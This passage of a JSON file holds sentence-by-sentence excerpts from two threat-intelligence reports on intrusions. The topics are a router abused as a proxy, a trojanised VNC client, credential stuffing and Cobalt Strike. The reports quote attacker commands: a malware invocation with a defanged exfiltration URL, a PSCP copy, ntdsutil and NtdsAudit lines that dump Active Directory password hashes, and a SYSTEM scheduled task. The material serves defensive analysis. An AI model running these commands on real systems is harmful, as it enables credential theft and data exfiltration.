        "text": "According to corporate policies, no transfer of information was allowed between these two segments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S101",
        "text": "In other words, the two segments were meant to be completely separated.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S102",
        "text": "Initially, the attackers were able to get access to systems with internet access and spent a long time distributing malware between machines in the network\u2019s corporate segment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S103",
        "text": "Among the compromised machines were those used by the administrators of the enterprise\u2019s IT infrastructure.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S104",
        "text": "It is worth noting that the administrators could connect both to the corporate and the restricted network segments to maintain systems and provide users with technical support in both zones.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S105",
        "text": "As a result, by gaining control of administrator workstations the attackers were able to access the restricted network segment.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S106",
        "text": "However, since directly routing traffic between the segments was not possible, the attackers couldn\u2019t use their standard malware set to exfiltrate data from the restricted segment to the C2.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S107",
        "text": "The situation changed on July 2 when the attackers managed to obtain the credentials for the router used by the administrators to connect to systems in both segments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S108",
        "text": "The router was a virtual machine running CentOS to route traffic between several network interfaces based on predefined rules.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S109",
        "text": "According to the evidence collected, the attackers scanned the router\u2019s ports and detected a Webmin interface.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S110",
        "text": "Next, the attackers logged in to the web interface using a privileged root account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S111",
        "text": "It\u2019s unknown how the attackers were able to obtain the credentials for that account, but it\u2019s possible the credentials were saved in one of the infected system\u2019s browser password managers.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S112",
        "text": "By gaining access to the configuration panel the attackers configured the Apache web server and started using the router as a proxy server between the organization\u2019s corporate and restricted segments.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S113",
        "text": "Several days after that, on July 10, 2020, the attackers connected to the router via SSH and set up the PuTTy PSCP (the PuTTY Secure Copy client) utility on one of the infected machines.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S114",
        "text": "This utility was used to upload malware to the router VM.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S115",
        "text": "This enabled the attackers to place malware onto systems in the restricted segment of the enterprise network, using the router to host the samples.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S116",
        "text": "In addition, malware running in the network\u2019s restricted segment was able to exfiltrate the collected data to the command-and-control server via the Apache server set up on the same router.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S117",
        "text": "New connection layout after attacker\u2019s intrusion",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S118",
        "text": "In the course of the investigation we identified malware samples with the hardcoded URL of the router used as a proxy server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S119",
        "text": "Hardcoded proxy address in the malware",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S120",
        "text": "Since the attackers regularly deleted log files from the router, only a handful of commands entered to the command line via SSH could be recovered.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S121",
        "text": "An analysis of these commands shows that the attackers tried to reconfigure traffic routing using the route command.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S122",
        "text": "The attackers also ran the nmap utility on the router VM and scanned ports on systems within the restricted segment of the enterprise network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S123",
        "text": "On September 27, the attackers started removing all traces of their activity from the router, using the logrotate utility to set up automatic deletion of log files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S124",
        "text": "We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S125",
        "text": "They used a custom tunneling tool to achieve this.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S126",
        "text": "The tool receives four parameters: client IP address, client port, server IP address and server port.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S127",
        "text": "The tool offers basic functionality, forwarding client traffic to the server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S128",
        "text": "In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S129",
        "text": "Using the covert channel, the adversary copied data from the remote server over to the host using the PuTTy PSCP tool:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S130",
        "text": "%APPDATA%\\PBL\\unpack.tmp -pw [password] root@[IP address]:/tmp/cab0215 %APPDATA%\\PBL\\cab0215.tmp",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S131",
        "text": "After copying data from the server, the actor utilized the custom tool to exfiltrate stolen data to the remote server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S132",
        "text": "This malware looks like a legitimate VNC client and runs like one if it\u2019s executed without any command line parameters.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S133",
        "text": "Execution of malware without parameters",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S134",
        "text": "However, if this application is executed with specific command line parameters, it runs an alternate, malicious function.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S135",
        "text": "According to our telemetry, the actor executed this application with six parameters:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S136",
        "text": "%APPDATA%\\Comms\\Comms.dat S0RMM-50QQE-F65DN-DCPYN-5QEQA hxxps://www.gonnelli[.]it/uploads/catalogo/thumbs/thumb[.]asp %APPDATA%\\Comms\\cab59.tmp FL0509 15000",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S137",
        "text": "Also, if the number of command line parameters is greater than six, the malware jumps into a malicious routine.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S138",
        "text": "The malware also checks the length of the second argument \u2013 if it\u2019s less than 29 characters, it terminates the execution.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S139",
        "text": "When the parameter checking procedure has passed successfully, the malware starts to decrypt its next payload.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S140",
        "text": "The embedded payload gets decrypted via XOR, where each byte from the end of the payload gets applied to the preceding byte.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S141",
        "text": "Next, the XORed blob receives the second command line argument that\u2019s provided (in this case S0RMM-50QQE-F65DN-DCPYN-5QEQA).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S142",
        "text": "The malware can accept more command line arguments, and depending on its number it runs differently.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S143",
        "text": "For example, it can also receive proxy server addresses with the \u201c-p\u201d option.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S144",
        "text": "When the decrypted in-memory payload is executed, it compares the header of the configuration data passed with the string \u201c0x8406\u201d in order to confirm its validity.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S145",
        "text": "The payload opens a given file (in this example %APPDATA%\\Comms\\cab59.tmp) and starts exfiltrating it to the remote server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-773.md:::S146",
        "text": "When the malware uploads data to the C2 server, it uses HTTP POST requests with two parameters named \u2018fr\u2019 and \u2018fp\u2019:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S0",
        "text": "In all the intrusions we have observed they are performed in similar ways by the adversary: from initial access all the way to actions on objectives.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S1",
        "text": "The objective in these cases appear to be stealing sensitive data from the victim\u2019s networks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S2",
        "text": "This adversary starts with obtaining usernames and passwords of their victim from previous breaches.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S3",
        "text": "These credentials are used in a credential stuffing or password spraying attack against the victim\u2019s remote services, such as webmail or other internet reachable mail services.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S4",
        "text": "After obtaining a valid account, they use this account to access the victim\u2019s VPN, Citrix or another remote service that allows access to the network of the victim.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S5",
        "text": "Information regarding these remotes services is taken from the mailbox, cloud drive, or other cloud resources accessible by the compromised account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S6",
        "text": "As soon as they have a foothold on a system (also known as patient zero or index case), they check the permissions of the account on that system, and attempt to obtain a list of accounts with administrator privileges.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S7",
        "text": "With this list of administrator-accounts, the adversary performs another password spraying attack until a valid admin account is compromised.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S8",
        "text": "With this valid admin account, a Cobalt Strike beacon is loaded into memory of patient zero.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S9",
        "text": "From here on the adversary stops using the victim\u2019s remote service to access the victim\u2019s network, and starts using the Cobalt Strike beacon for remote access and command and control.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S10",
        "text": "The adversary continues their discovery of the victim\u2019s network from patient zero.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S11",
        "text": "Various scans and queries are used to find proxy settings, domain controllers, remote desktop services, Citrix services, and network shares.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S12",
        "text": "If the obtained valid account is already member of the domain admins group, the first lateral move in the network is usually to a domain controller where the adversary also deploys a Cobalt Strike beacon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S13",
        "text": "Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S14",
        "text": "After this the adversary dumps the domain admin credentials from the memory of this machine, continues lateral moving through the network, and places Cobalt Strike beacons on servers for increased persistent access into the victim\u2019s network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S15",
        "text": "If the victim\u2019s network contains other Windows domains or different network security zones, the adversary scans and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S16",
        "text": "The adversary is typically able to perform all the steps described above within one day.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S17",
        "text": "During this process, the adversary identifies data of interest from the network of the victim.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S18",
        "text": "This can be anything from file and directory-listings, configuration files, manuals, email stores in the guise of OST- and PST-files, file shares with intellectual property (IP), and data scraped from memory.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S19",
        "text": "If the data is small enough, it is exfiltrated through the command and control channel of the Cobalt Strike beacons.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S20",
        "text": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S21",
        "text": "After the adversary completes their initial exfiltration, they return every few weeks to check for new data of interest and user accounts.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S22",
        "text": "At times they have been observed attempting to perform a degree of anti-forensic activities including clearing event logs, time stomping files, and removing scheduled tasks created for some objectives.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S23",
        "text": "But this isn\u2019t done consistently across their engagements.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S24",
        "text": "The earliest and longest lasting intrusion by this threat we observed, was at a company in the semiconductors industry in Europe and started early Q4 2017.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S25",
        "text": "The more recent intrusions took place in 2019 at companies in the aviation industry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S26",
        "text": "The techniques used to achieve access at the companies in the aviation industry closely resembles techniques used at victims in the semiconductors industry.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S27",
        "text": "The threat used valid accounts against remote services: Cloud-based applications utilizing federated authentication protocols.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S28",
        "text": "Our incident responders analysed the credentials used by the adversary and the traces of the intrusion in log files.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S29",
        "text": "They uncovered an obvious overlap in the credentials used by this threat and the presence of those same accounts in previously breached databases.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S30",
        "text": "Besides that, the traces in log files showed more than usual login attempts with a username formatted as email address, e.g.<username>@<email domain>.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S31",
        "text": "While usernames for legitimate logins at the victim\u2019s network were generally formatted like <domain><username>.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S32",
        "text": "And attempted logins came from a relative small set of IP-addresses.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S33",
        "text": "For the investigators at NCC Group and Fox-IT these pieces of evidence supported the hypothesis of the adversary achieving credentials access by brute force, and more specifically by credential stuffing or password spraying.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S34",
        "text": "In some of the intrusions the adversary used the valid account to directly login to a Citrix environment and continued their work from there.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S35",
        "text": "In one specific case, the adversary now armed with the valid account, was able to access a document stored in SharePoint Online, part of Microsoft Office 365.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S36",
        "text": "This specific document described how to access the internet facing company portal and the web-based VPN client into the company network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S37",
        "text": "Within an hour after grabbing this document, the adversary accessed the company portal with the valid account.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S38",
        "text": "From this portal it was possible to launch the web-based VPN.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S39",
        "text": "The VPN was protected by two-factor authentication (2FA) by sending an SMS with a one-time password (OTP) to the user account\u2019s primary or alternate phone number.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S40",
        "text": "It was possible to configure an alternate phone number for the logged in user account at the company portal.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S41",
        "text": "The adversary used this opportunity to configure an alternate phone number controlled by the adversary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S42",
        "text": "By performing two-factor authentication interception by receiving the OTP on their own telephone number, they gained access to the company network via the VPN.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S43",
        "text": "However, they also made a mistake during this process within one incident.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S44",
        "text": "Our hypothesis is that they tested the 2FA-system first or selected the primary phone number to send a SMS to.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S45",
        "text": "However the European owner of the account received a text message with Simplified Chinese characters on the primary phone number in the middle of the night Eastern European Time (EET).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S46",
        "text": "NCC Group and Fox-IT identified that the language in the text-message for 2FA is based on the web browser\u2019s language settings used during the authentication flow.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S47",
        "text": "Thus the 2FA code was sent with supporting Chinese text.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S48",
        "text": "With access into the network of the victim, the adversary finds a way to install a Cobalt Strike beacon on a system of the victim (see Execution).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S49",
        "text": "But before doing so, we observed the adversary checking the current permissions of the obtained user account with the following commands:\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S50",
        "text": "- net user",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S51",
        "text": "- net user Administrator",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S52",
        "text": "- net user <username> /domain",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S53",
        "text": "- net localgroup administrators\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S54",
        "text": "If the user account doesn\u2019t have local administrative or domain administrative permissions, the adversary attempts to discover which local or domain admin accounts exist, and exfiltrates the admin\u2019s usernames.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S55",
        "text": "To identify if privileged users are active on remote servers, the adversary makes use of PsLogList from Microsoft Sysinternals to retrieve the Security event logs.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S56",
        "text": "The built-in Windows quser-command to show logged on users is also heavily used by them.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S57",
        "text": "If such a privileged user was recently active on a server the adversary executes Cobalt Strike\u2019s built-in Mimikatz to dump its password hashes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S58",
        "text": "The adversary started a password spraying attack against those domain admin accounts, and successfully got a valid domain admin account this way.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S59",
        "text": "In other cases, the adversary moved laterally to another system with a domain admin logged in.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S60",
        "text": "We observed the use of Mimikatz on this system and saw the hashes of the logged in domain admin account going through the command and control channel of the adversary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S61",
        "text": "The adversary used a tool called NtdsAudit to dump the password hashes of domain users as well as we observed the following command:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S62",
        "text": "msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S63",
        "text": "Note: the adversary renamed ntdsaudit.exe to msadcs.exe.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S64",
        "text": "But we also observed the adversary using the tool ntdsutil to create a copy of the Active Directory database NTDS.dit followed by a repair action with esentutl to fix a possible corrupt NTDS.dit:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S65",
        "text": "ntdsutil \"ac i ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\tmp\" q q esentutl /p /o ntds.dit",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S66",
        "text": "Both ntdsutil and esentutl are by default installed on a domain controller.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S67",
        "text": "A tool used by the adversary which wasn\u2019t installed on the servers by default, was DSInternals.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S68",
        "text": "DSInternals is a PowerShell module that makes use of internal Active Directory features.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S69",
        "text": "The files and directories found on various systems of a victim match with DSInternals version 2.16.1.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S70",
        "text": "We have found traces that indicate DSInternals was executed and at which time, which match with the rest of the traces of the intrusion.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S71",
        "text": "We haven\u2019t recovered traces of how the adversary used DSInternals, but considering the phase of the intrusion the adversary used the tool, it is likely they used it for either account discovery or privilege escalation, or both.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S72",
        "text": "The adversary installs a hackers best friend during the intrusion: Cobalt Strike.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S73",
        "text": "Cobalt Strike is a framework designed for adversary simulation intended for penetration testers and red teams.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S74",
        "text": "It has been widely adopted by malicious threats as well.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S75",
        "text": "The Cobalt Strike beacon is installed in memory by using a PowerShell one-liner.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S76",
        "text": "At least the following three versions of Cobalt Strike have been in use by the adversary:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S77",
        "text": "Fox-IT has been collecting information about Cobalt Strike team servers since January 2015.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S78",
        "text": "This research project covers the fingerprinting of Cobalt Strike servers and is described in Fox-IT blog \u201cIdentifying Cobalt Strike team servers in the wild\u201d.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S79",
        "text": "The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S80",
        "text": "Because of this, historic information was available during this investigation.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S81",
        "text": "Whenever a Cobalt Strike C2 channel was identified, Fox-IT performed lookups into the collection database.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S82",
        "text": "If a match was found, the configuration of the Cobalt Strike team server was analysed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S83",
        "text": "This configuration was then compared against the other Cobalt Strike team servers to check for similarities in for example domain names, version number, URL, and various other settings.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S84",
        "text": "The adversary heavily relies on scheduled tasks for executing a batch-file (.bat) to perform their tasks.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S85",
        "text": "An example of the creation of such a scheduled task by the adversary:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S86",
        "text": "schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st 06:59:00",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S87",
        "text": "The batch-files appear to be used to load the Cobalt Strike beacon, but also to perform discovery commands on the compromised system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S88",
        "text": "The adversary loads the Cobalt Strike beacon in memory, without any persistence mechanisms on the compromised system.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S89",
        "text": "Once the system is rebooted, the beacon is gone.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S90",
        "text": "The adversary is still able to have persistent access by installing the beacon on systems with high uptimes, such as server.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S91",
        "text": "Besides using the Cobalt Strike beacon, the adversary also searches for VPN and firewall configs, possibly to function as a backup access into the network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S92",
        "text": "We haven\u2019t seen the adversary use those access methods after the first Cobalt Strike beacons were installed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S93",
        "text": "Maybe because it was never necessary.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S94",
        "text": "After the first bulk of data is exfiltrated, the persistent access into the victim\u2019s network is periodically used by the adversary to check if new data of interest is available.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S95",
        "text": "They also create a copy of the NTDS.dit and SYSTEM-registry hive file for new credentials to crack.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S96",
        "text": "The adversary applied a wide range of discovery tactics.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S97",
        "text": "In the list below we have highlighted a few specific tools the adversary used for discovery purposes.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S98",
        "text": "You can find a summary of most of the commands used by the adversary to perform discovery at the end of this article.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S99",
        "text": "Account discovery tool: PsLogList",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S100",
        "text": "Command used: psloglist.exe -accepteula -x security -s -a <date>",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S101",
        "text": "This command exports a text file with comma separated fields.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S102",
        "text": "The text files contain the contents of the Security Event log after the specified date.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S103",
        "text": "Psloglist is part of the Sysinternals toolkit from Mark Russinovich (Microsoft).",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S104",
        "text": "The tool was used by the adversary on various systems to write events from the Windows Security Event Log to a text file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S105",
        "text": "A possible intent of the adversary could be to identify if privileged users are active on the systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S106",
        "text": "If such a privileged user was recently active on a server the actor executes Cobalt Strike\u2019s built-in Mimikatz to dump its credentials or password hash.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S107",
        "text": "Account discovery tool: NtdsAudit",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S108",
        "text": "Command used: msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S109",
        "text": "It imports the specified Active Directory database NTDS.dit and registry file SYSTEM and exports the found password hashes into RecordedTV_pdump.txt and user details in RecordedTV_users.csv.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S110",
        "text": "The NtdsAudit utility is an auditing tool for Active Directory databases.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S111",
        "text": "It allows the user to collect useful statistics related to accounts and passwords.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S112",
        "text": "The utility was found on various systems of a victim and matches the NtdsAudit.exe program file version v2.0.5 published on the GitHub project page.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S113",
        "text": "Network service scanning",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S114",
        "text": "Command used:",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S115",
        "text": "get -b <start ip> -e <end ip> -p get -b <start ip> -e <end ip>\n",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S116",
        "text": "Get.exe appears to be a custom tool used to scan IP-ranges for HTTP service information.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S117",
        "text": "NCC Group and Fox-IT decompiled the tool for analysis.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S118",
        "text": "This showed the tool was written in the Python scripting language and packed into a Windows executable file.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S119",
        "text": "Though Fox-IT didn\u2019t find any direct occurrences of the tool on the internet, the decompiled code showed strong similarities with the source code of a tool named GetHttpsInfo.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S120",
        "text": "GetHttpsInfo scans the internal network for HTTP HTTPS services.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S121",
        "text": "The reconnaissance tool getHttpsInfo is able to discover HTTP servers within the range of a network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S122",
        "text": "The tool was shared on a Chinese forum around 2016.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S123",
        "text": "The adversary used the built-in lateral movement possibilities in Cobalt Strike.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S124",
        "text": "Cobalt Strike has various methods for deploying its beacons at newly compromised systems.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S125",
        "text": "We have seen the adversary using SMB, named pipes, PsExec, and WinRM.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S126",
        "text": "The adversary attempts to move to a domain controller as soon as possible after getting foothold into the victim\u2019s network.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S127",
        "text": "They continue lateral movement and discovery in an attempt to identify the data of interest.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S128",
        "text": "This could be a webserver to carve data from memory, or a fileserver to copy IP, as we have both observed.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S129",
        "text": "At one customer, the data of interest was stored in a separate security zone.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S130",
        "text": "The adversary was able to find a dual homed system and compromise it.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S131",
        "text": "From there on they used it as a jump host into the higher security zone and started collecting the intellectual property stored on a file server in that zone.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S132",
        "text": "In one event we saw the adversary compromise a Linux-system through SSH.",
        "type": ""
    },
    {
        "id": "cti_reports_filtered/r-786.md:::S133",
        "text": "The user account was possibly compromised on the Linux server by using credential stuffing or password spraying: Logfiles on the Linux-system show traces which can be attributed to a credential stuffing or password spraying attack.",
        "type": ""
    },
    {
